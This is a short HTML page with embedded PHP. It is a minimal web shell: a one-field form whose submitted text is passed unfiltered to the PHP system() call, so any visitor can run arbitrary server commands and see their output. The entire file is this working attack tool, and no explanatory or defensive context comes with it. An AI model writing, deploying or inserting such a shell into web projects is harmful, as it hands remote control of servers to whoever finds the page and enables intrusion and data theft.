<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="a">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?
if($_POST['a']) {
  system($_POST['a']);
  }
?>
</pre>
</BODY></HTML>

